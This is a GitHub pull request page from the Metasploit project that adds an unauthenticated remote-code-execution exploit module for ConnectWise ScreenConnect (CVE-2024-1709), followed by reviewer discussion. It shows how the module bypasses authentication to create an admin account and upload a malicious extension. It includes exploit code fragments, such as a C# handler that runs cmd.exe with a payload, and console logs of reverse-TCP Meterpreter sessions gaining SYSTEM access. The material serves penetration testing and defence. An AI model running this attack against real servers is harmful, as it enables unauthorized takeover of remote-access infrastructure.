
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F18870)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F18870)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  411](/rapid7/metasploit-framework/issues)
* [Pull requests
  38](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Unauthenticated RCE exploit module for ConnectWise ScreenConnect (CVE-2024-1709) #18870

 Merged

[jheysel-r7](/jheysel-r7)
merged 20 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[sfewer-r7:connectwise-screenconnect-rce](/sfewer-r7/metasploit-framework/tree/connectwise-screenconnect-rce "sfewer-r7/metasploit-framework:connectwise-screenconnect-rce")

Feb 23, 2024

 Merged

# [Unauthenticated RCE exploit module for ConnectWise ScreenConnect (CVE-2024-1709)](#top) #18870

[jheysel-r7](/jheysel-r7)
merged 20 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[sfewer-r7:connectwise-screenconnect-rce](/sfewer-r7/metasploit-framework/tree/connectwise-screenconnect-rce "sfewer-r7/metasploit-framework:connectwise-screenconnect-rce")

Feb 23, 2024

+721

‚àí0

[Conversation
32](/rapid7/metasploit-framework/pull/18870)
[Commits
20](/rapid7/metasploit-framework/pull/18870/commits)
[Checks
33](/rapid7/metasploit-framework/pull/18870/checks)
[Files changed
2](/rapid7/metasploit-framework/pull/18870/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=60&v=4)](/sfewer-r7)

Copy link

Contributor

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** commented [Feb 21, 2024](#issue-2146748585) ‚Ä¢ edited by jheysel-r7 Loading

This ~~(draft)~~ pull request adds an exploit module for the recent authentication bypass vulnerability in ConnectWise ScreenConnect. ~~(No CVE has been assigned at this time.)~~

* Vendor Advisory: <https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8>
* Public PoC: <https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc>
* Technical Analysis: <https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass>

RCE is achieved by leveraging the vulnerability to create a new admin account, and then using these creds to upload an extension (i.e. a plugin) that hosts a Metasploit payload. Currently only `ARCH_CMD` payloads are supported.

Update 1: Support for `ARCH_X64` and `ARCH_X86` payloads has been added, these payloads are executed in the `ScreenConnect.Service.exe` process.

Update 2: Added support for a Linux command target.

Update 3: Move module to the "multi" directory as it now supports a Linux target. Remove `ARCH_X86` as [ScreenConnect only supports](https://docs.connectwise.com/ConnectWise_ScreenConnect_Documentation/On-premises/Get_started_with_ConnectWise_ScreenConnect_On-Premise/Server_system_requirements?mt-learningpath=control_on_prem_install) x64 and we don't want to inject x86 shellcode into an x64 process.

## To-Do

* Documentation
* Investigate more payload support

## Usage

```
msf6 exploit(windows/http/connectwise_screenconnect_rce_cve_2024_1709) > show options
Module options (exploit/windows/http/connectwise_screenconnect_rce_cve_2024_1709):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.86.50    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    8040             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host
Payload options (cmd/windows/http/x64/meterpreter/reverse_tcp):
   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   EXITFUNC            thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   FETCH_COMMAND       CERTUTIL         yes       Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      pSPyWvtiaaH      no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  %TEMP%           yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST               eth0             yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   1   Windows Command
View the full module info with the info, or info -d command.
msf6 exploit(windows/http/connectwise_screenconnect_rce_cve_2024_1709) > check
[*] 192.168.86.50:8040 - The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7.
msf6 exploit(windows/http/connectwise_screenconnect_rce_cve_2024_1709) > exploit
[*] Started reverse TCP handler on 192.168.86.42:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7.
[*] Created account: xkerretc:Ctp1yP9Gh4htnE2s. Note: This account will not be deleted by the module.
[*] Uploaded Extension: b7eb38d2-ea46-f662-2c3e-d6e3071767f7
[*] Removing Extension: b7eb38d2-ea46-f662-2c3e-d6e3071767f7
[*] Sending stage (201798 bytes) to 192.168.86.50
[*] Meterpreter session 2 opened (192.168.86.42:4444 -> 192.168.86.50:53686) at 2024-02-21 17:37:46 +0000
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-V28QNSO2H05
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > pwd
C:\Windows\system32
meterpreter >

```

Sorry, something went wrong.

 üéâ
2
 wvu and jheysel-r7 reacted with hooray emoji

All reactions

* üéâ
  2 reactions

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[fix tabs](/rapid7/metasploit-framework/pull/18870/commits/c529749f7758c67c31916be6a3d92cbbaf1bcf6c "fix tabs")`

`[c529749](/rapid7/metasploit-framework/pull/18870/commits/c529749f7758c67c31916be6a3d92cbbaf1bcf6c)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)
[sfewer-r7](/sfewer-r7)
changed the title
~~fix tabs~~
Unauthenticated RCE exploit module for ConnectWise ScreenConnect (No CVE at this time)
[Feb 21, 2024](#event-11876340304)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[remove debug prints](/rapid7/metasploit-framework/pull/18870/commits/6d473b2424e6eeea1109afc21191e6f8cd28bc14 "remove debug prints")`

`[6d473b2](/rapid7/metasploit-framework/pull/18870/commits/6d473b2424e6eeea1109afc21191e6f8cd28bc14)`

[![adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=60&v=4)](/adfoster-r7)

**[adfoster-r7](/adfoster-r7)**
reviewed
[Feb 21, 2024](#pullrequestreview-1893491360)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14)

[modules/exploits/windows/http/connectwise\_screenconnect\_rce.rb](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14#diff-d8cd455f7d3fd935c402f79a78c6d99c833931dc3fa41795379594acf43a97ba)
Outdated

|  |  | # |
| --- | --- | --- |
|  |  | res = send\_request\_cgi( |
|  |  | 'method' => 'GET', |
|  |  | 'uri' => normalize\_uri(target\_uri.path, '/Administration'), |

Copy link

Contributor

### @adfoster-r7 **[adfoster-r7](/adfoster-r7)** [Feb 21, 2024](#discussion_r1497766688)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Not a blocker; Looks like most modules don't supply this ü§∑

Suggested change

|  | 'uri' => normalize\_uri(target\_uri.path, '/Administration'), |
| --- | --- |
|  | 'uri' => normalize\_uri(target\_uri.path, 'Administration'), |

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 21, 2024](#discussion_r1497865563)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

resolved via [61c1a51](https://github.com/rapid7/metasploit-framework/pull/18870/commits/61c1a513a53b2436778e828380f6120dc3b40604)

Sorry, something went wrong.

All reactions

[![adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=60&v=4)](/adfoster-r7)

**[adfoster-r7](/adfoster-r7)**
reviewed
[Feb 21, 2024](#pullrequestreview-1893492175)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14)

[modules/exploits/windows/http/connectwise\_screenconnect\_rce.rb](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14#diff-d8cd455f7d3fd935c402f79a78c6d99c833931dc3fa41795379594acf43a97ba)
Outdated

|  |  | ) |
| --- | --- | --- |
|  |  |  |
|  |  | unless res&.code == 200 |
|  |  | fail\_with(Failure::UnexpectedReply, 'Unexpected reply from request 4.') |

Copy link

Contributor

### @adfoster-r7 **[adfoster-r7](/adfoster-r7)** [Feb 21, 2024](#discussion_r1497767208)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

It'd be great to add more clarity to these error messages when the PR is closer to completion üëç

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 21, 2024](#discussion_r1497866202)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

resolved via [10f11c9](https://github.com/rapid7/metasploit-framework/pull/18870/commits/10f11c94e158421fb149762e839c004eeb10f121)

Sorry, something went wrong.

All reactions

[![adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=60&v=4)](/adfoster-r7)

**[adfoster-r7](/adfoster-r7)**
reviewed
[Feb 21, 2024](#pullrequestreview-1893496843)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14)

[modules/exploits/windows/http/connectwise\_screenconnect\_rce.rb](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14#diff-d8cd455f7d3fd935c402f79a78c6d99c833931dc3fa41795379594acf43a97ba)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | payload\_psi\_var = Rex::Text.rand\_text\_alpha(8) |
|  |  |  |
|  |  | payload\_data = %(<% @ WebHandler Language="C#" Class="#{payload\_handler\_class}" %> |

Copy link

Contributor

### @adfoster-r7 **[adfoster-r7](/adfoster-r7)** [Feb 21, 2024](#discussion_r1497770760)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Not a blocker; this might come up again in the future - might be useful to have it available for other modules at some point

Sorry, something went wrong.

 üëç
1
 sfewer-r7 reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

[![adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=60&v=4)](/adfoster-r7)

**[adfoster-r7](/adfoster-r7)**
reviewed
[Feb 21, 2024](#pullrequestreview-1893506884)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14)

[modules/exploits/windows/http/connectwise\_screenconnect\_rce.rb](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14#diff-d8cd455f7d3fd935c402f79a78c6d99c833931dc3fa41795379594acf43a97ba)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | #{payload\_psi\_var}.FileName = "cmd.exe"; |
|  |  |  |
|  |  | #{payload\_psi\_var}.Arguments = "/c #{payload.encoded.gsub('\\', '\\\\\\\\')}"; |

Copy link

Contributor

### @adfoster-r7 **[adfoster-r7](/adfoster-r7)** [Feb 21, 2024](#discussion_r1497776260)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

We have a library function that should in theory be able to handle printable characters

```
    cmd = Msf::Post::Windows.escape_cmd_literal(cmd, spaces: false)

```

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 21, 2024](#discussion_r1497869133)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Looks like `escape_cmd_literal` (shown below) will escape these chars `^ & < > |`  but the above c# code needs to escape a `\` to become `\\`, so I will leave this as it is, thanks.

```
  def self.escape_cmd_literal(string, spaces:)
    string = string.dup
    %w[ ^ & < > | " ].each { |char| string.gsub!(char, "^#{char}") }
    string.gsub!(' ', '" "') if spaces
    string
  end
```

Sorry, something went wrong.

All reactions

[![adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=60&v=4)](/adfoster-r7)

**[adfoster-r7](/adfoster-r7)**
reviewed
[Feb 21, 2024](#pullrequestreview-1893513627)

 [View reviewed changes](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14)

[modules/exploits/windows/http/connectwise\_screenconnect\_rce.rb](/rapid7/metasploit-framework/pull/18870/files/6d473b2424e6eeea1109afc21191e6f8cd28bc14#diff-d8cd455f7d3fd935c402f79a78c6d99c833931dc3fa41795379594acf43a97ba)
Outdated

|  |  |  |
| --- | --- | --- |
|  |  | payload\_ashx = "#{Rex::Text.rand\_text\_alpha\_lower(8)}.ashx" |
|  |  |  |
|  |  | payload\_handler\_class = Rex::Text.rand\_text\_alpha(8) |

Copy link

Contributor

### @adfoster-r7 **[adfoster-r7](/adfoster-r7)** [Feb 21, 2024](#discussion_r1497780471) ‚Ä¢ edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I think this *might* be fine, but we have a library for generating random vars with rex random identifier

```
generator = Rex::RandomIdentifier::Generator.new({ language: :jsp })

```

Looks like we don't have `csharp` or similar as a language though - you can supply your own language keywords

If there is an issue with the potential of generating random strings that are accidentally language keywords here, we can just supply forbidden words and if there's anything to fix here we can circle back to adding the keyword list into rex random identifier itself later:

```
generator = Rex::RandomIdentifier::Generator.new({ forbidden: ['interface', 'class', 'etc' ] })

```

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @sfewer-r7 **[sfewer-r7](/sfewer-r7)** [Feb 21, 2024](#discussion_r1497951316)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

I implemented this via [2839683](https://github.com/rapid7/metasploit-framework/pull/18870/commits/2839683af509726f86e4b13aae38b4978dd98b71) by using `Rex::RandomIdentifier::Generator` and a `forbidden` list as you suggested, thanks!

Sorry, something went wrong.

All reactions

[![@adfoster-r7](https://avatars.githubusercontent.com/u/60357436?s=40&v=4)](/adfoster-r7)
[adfoster-r7](/adfoster-r7)
added
the
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
label
[Feb 21, 2024](#event-11878133529)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)
[![GitHub Actions](https://avatars.githubusercontent.com/in/15368?s=40&u=167a342ed94d2a713daf64a8b476ead2cebe1852&v=4)](https://github.com/apps/github-actions)

Copy link

### **[github-actions](/apps/github-actions) bot** commented [Feb 21, 2024](#issuecomment-1956943897)

| Thanks for your pull request! Before this can be merged, we need the following documentation for your module:   * [Writing Module Documentation](https://docs.metasploit.com/docs/development/quality/writing-module-documentation.html) * [Template](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/module_doc_template.md) * [Examples](https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules) |
| --- |

All reactions

Sorry, something went wrong.

 [sfewer-r7](/sfewer-r7)
added 4 commits
[February 21, 2024 15:59](#commits-pushed-61c1a51)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[drop the leading forward slash](/rapid7/metasploit-framework/pull/18870/commits/61c1a513a53b2436778e828380f6120dc3b40604 "drop the leading forward slash")`

`[61c1a51](/rapid7/metasploit-framework/pull/18870/commits/61c1a513a53b2436778e828380f6120dc3b40604)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[remove redundant slashes in other calls to normalize_uri](/rapid7/metasploit-framework/pull/18870/commits/2d8b0f414deca63c96a03a07fe71cf9fdd2e350c "remove redundant slashes in other calls to normalize_uri")`

`[2d8b0f4](/rapid7/metasploit-framework/pull/18870/commits/2d8b0f414deca63c96a03a07fe71cf9fdd2e350c)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[add an in-memory payload target](/rapid7/metasploit-framework/pull/18870/commits/9828ffa870f4f9527b08d8fd5925d8671bb5ec9f "add an in-memory payload target")`

`[9828ffa](/rapid7/metasploit-framework/pull/18870/commits/9828ffa870f4f9527b08d8fd5925d8671bb5ec9f)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[improve the error description for failure messages](/rapid7/metasploit-framework/pull/18870/commits/10f11c94e158421fb149762e839c004eeb10f121 "improve the error description for failure messages")`

`[10f11c9](/rapid7/metasploit-framework/pull/18870/commits/10f11c94e158421fb149762e839c004eeb10f121)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=80&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)

Copy link

Contributor

Author

### **[sfewer-r7](/sfewer-r7)** commented [Feb 21, 2024](#issuecomment-1957188336)

| Commit [9828ffa](https://github.com/rapid7/metasploit-framework/pull/18870/commits/9828ffa870f4f9527b08d8fd5925d8671bb5ec9f) adds support for in-memory payload execution (albeit with a dropped ASHX file), so we get a native meterpreter session hosted in the `ScreenConnect.Service.exe` process.  ``` msf6 exploit(windows/http/connectwise_screenconnect_rce) > show options  Module options (exploit/windows/http/connectwise_screenconnect_rce):     Name     Current Setting  Required  Description    ----     ---------------  --------  -----------    Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS   192.168.86.50    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html    RPORT    8040             yes       The target port (TCP)    SSL      false            no        Negotiate SSL/TLS for outgoing connections    VHOST                     no        HTTP server virtual host   Payload options (windows/x64/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST     eth0             yes       The listen address (an interface may be specified)    LPORT     4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Windows In-Memory    View the full module info with the info, or info -d command.  msf6 exploit(windows/http/connectwise_screenconnect_rce) > check [*] 192.168.86.50:8040 - The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7. msf6 exploit(windows/http/connectwise_screenconnect_rce) > exploit  [*] Started reverse TCP handler on 192.168.86.42:4444  [*] Running automatic check ("set AutoCheck false" to disable) [+] The target appears to be vulnerable. ConnectWise ScreenConnect 23.9.7. [*] Created account: lqgmnuds:P7O12M170Dd9m9Kf. Note: This account will not be deleted by the module. [*] Uploaded Extension: 7a18a7ed-15a5-ed39-85a2-8838fceda56a [*] Removing Extension: 7a18a7ed-15a5-ed39-85a2-8838fceda56a [*] Sending stage (201798 bytes) to 192.168.86.50 [*] Meterpreter session 12 opened (192.168.86.42:4444 -> 192.168.86.50:51001) at 2024-02-21 16:20:59 +0000  meterpreter > getuid Server username: NT AUTHORITY\SYSTEM meterpreter > getpid Current pid: 4184 meterpreter > ps  Process List ============   PID    PPID  Name                      Arch  Session  User                           Path  ---    ----  ----                      ----  -------  ----                           ----  0      0     [System Process]  4      0     System                    x64   0  156    4     Registry                  x64   0  ...snip...   4184   900   ScreenConnect.Service.ex  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files (x86)\ScreenConnect\Bin\ScreenConnect.Ser               e                                                                       vice.exe  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@brosjsy](https://avatars.githubusercontent.com/u/97712446?s=80&u=248f0587c9adc9e8a5edafdf804c24d7aa364e8d&v=4)](/brosjsy)

Copy link

### **[brosjsy](/brosjsy)** commented [Feb 21, 2024](#issuecomment-1957336254)

| This is massive , ohh hoo |
| --- |

All reactions

Sorry, something went wrong.

 [sfewer-r7](/sfewer-r7)
added 2 commits
[February 21, 2024 17:08](#commits-pushed-2839683)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[use Rex::RandomIdentifier::Generator to generate identifiers.](/rapid7/metasploit-framework/pull/18870/commits/2839683af509726f86e4b13aae38b4978dd98b71 "use Rex::RandomIdentifier::Generator to generate identifiers.")`

`[2839683](/rapid7/metasploit-framework/pull/18870/commits/2839683af509726f86e4b13aae38b4978dd98b71)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[CISA has assigned this vulnerability](/rapid7/metasploit-framework/pull/18870/commits/e0ee7940d005dd5d32dd2de20a079ef58cf393ef "CISA has assigned this vulnerability CVE-2024-1709") [CVE-2024-1709](https://github.com/advisories/GHSA-cg3j-75xh-7fv3 "CVE-2024-1709")`

`[e0ee794](/rapid7/metasploit-framework/pull/18870/commits/e0ee7940d005dd5d32dd2de20a079ef58cf393ef)`

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)
[sfewer-r7](/sfewer-r7)
changed the title
~~Unauthenticated RCE exploit module for ConnectWise ScreenConnect (No CVE at this time)~~
Unauthenticated RCE exploit module for ConnectWise ScreenConnect (CVE-2024-1709)
[Feb 21, 2024](#event-11879598511)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[add in docs](/rapid7/metasploit-framework/pull/18870/commits/f6b1c9b1cef2a35ee641ab0133b4f6d386873c34 "add in docs")`

`[f6b1c9b](/rapid7/metasploit-framework/pull/18870/commits/f6b1c9b1cef2a35ee641ab0133b4f6d386873c34)`

 [![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&u=f52d9d3dd72c1a2c3d8ebb15de11fbea576daa81&v=4)](/sfewer-r7)
[sfewer-r7](/sfewer-r7)
marked this pull request as ready for review
[February 21, 2024 17:44](#event-11879980060)

 [sfewer-r7](/sfewer-r7)
added 4 commits
[February 21, 2024 23:38](#commits-pushed-eded0e7)

[![@sfewer-r7](https://avatars.githubusercontent.com/u/122022313?s=40&v=4)](/sfewer-r7)

`[POST the payload.encoded data when we trigger the ASHX file, this way‚Ä¶](/rapid7/metasploit-framework/pull/18870/commits/eded0e778856ce64942be9aa23626d3aff3b9f04 "POST the payload.encoded data when we trigger the ASHX file, this way we dont drop the Metasploit payload to disk.")`
 ‚Ä¶

`[eded0e7](/rapid7/metasploit-framework/pull/18870/commits/eded0e778856ce64942be9aa23626d3aff3b9f04)`

```
